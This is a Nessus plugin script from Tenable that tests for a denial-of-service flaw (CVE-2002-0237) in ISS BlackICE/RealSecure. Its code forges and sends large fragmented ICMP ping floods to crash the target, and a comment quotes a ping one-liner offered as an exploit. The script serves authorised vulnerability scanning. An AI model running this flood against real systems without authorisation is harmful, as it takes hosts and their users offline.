#
# (C) Tenable Network Security, Inc.
#

# TBD : eEye gives this "exploit": ping -s 60000 -c 16 -p CC 1.1.1.1
#       But according to others, it doesn't work.


include("compat.inc");


if(description)
{
 script_id(10927);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-2002-0237");
 script_bugtraq_id(4025);
 script_xref(name:"OSVDB", value:"2039");

 script_name(english:"ISS BlackICE / RealSecure Large ICMP Ping Packet Overflow DoS");
 script_summary(english:"Ping flood the remote machine and kills BlackICE");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The application running on the remote host has a remote buffer\n",
     "overflow vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be running either BlackICE or RealSecure\n",
     "Server Sensor.\n\n",
     "This application has a remote buffer overflow vulnerability.  It was\n",
     "possible to crash the application by flooding it with 10 KB ping\n",
     "packets.\n\n",
     "A remote attacker could exploit this to cause a denial of service, or\n",
     "potentially execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2002-01/0423.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2002-01/0441.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2002-01/0445.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.iss.net/threats/advise109.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the appropriate patch referenced in the ISS advisory."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");

 script_family(english:"Firewalls");
		       
 #script_add_preference(name:"Flood length :", type:"entry", value:"600");
 #script_add_preference(name:"Data length :", type:"entry", value:"10000");
 script_require_keys("Settings/ThoroughTests", "Settings/ParanoidReport");
 exit(0);
}

include("global_settings.inc");
if ( TARGET_IS_IPV6 ) exit(0);

if (! thorough_tests || report_paranoia < 2) exit(0);

#
# The script code starts here
#

start_denial();

#fl = script_get_preference("Flood length :");
if (! fl) fl = 600;
#dl = script_get_preference("Data length :");
if (! dl) dl = 60000;

mtu = get_kb_item('ICMP/PMTU');
if (! mtu) mtu = get_kb_item('TCP/PMTU');
if (! mtu) mtu = 1500; 

maxdata = mtu - 20 - 8;	# IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if (maxdata < 16) maxdata = 544;

src = this_host();
dst = get_host_ip();
id = 666;
seq = 0;

for (i = 0; i < fl; i=i+1)
{
 id = id + 1;
 seq = seq + 1;
 for (j = 0; j < dl; j=j+maxdata)
 {
  datalen = dl - j;
  o = j / 8;
  if (datalen > maxdata) {
   o = o | 0x2000;
   datalen = maxdata;
  }
  ##display(string("i=",i,"; j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
	     	        ip_src:this_host());
  icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		  icmp_seq: seq, icmp_id:seq, data:crap(datalen-8));
  send_packet(icmp, pcap_active: 0);
 }
}

alive = end_denial();
if(!alive){
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

